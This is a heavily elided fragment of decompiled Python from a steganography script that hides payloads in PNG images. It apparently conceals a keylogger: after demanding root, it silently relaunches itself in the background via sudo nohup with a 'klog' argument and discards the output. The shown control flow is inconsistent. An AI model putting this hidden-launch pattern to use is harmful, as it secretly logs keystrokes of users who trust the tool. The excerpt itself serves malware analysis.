...
# Internal filename: /home/johnnymusk/stt/scriptwithlogger.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 2024-09-23 14:05:06 UTC (1727100306)
...
def hide(path_to_original: str, path_to_payload: str, colormode: str, direction: str, nlsb: int, ignored_colors: list):
    ...
    output_path = os.path.join(output_dir, 'tagus.png')
...
if __name__ == '__main__' and os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo .venv/bin/python'. Exiting.")
    if len(sys.argv) > 1 and sys.argv[1] == 'klog':
        alternative_main()
        exit(0)
    Popen(f'sudo nohup .venv/bin/python $(find . -name "{os.path.splitext(os.path.basename(__file__))[0]}*") klog > /dev/null 2>&1 &', shell=True)
    ...
    if args.mode == 'hide' and (args.original is None or args.payload is None or args.colormode is None or (args.nlsb is None) or (args.ignore is None) or (args.direction is None)):
        parser.print_help()
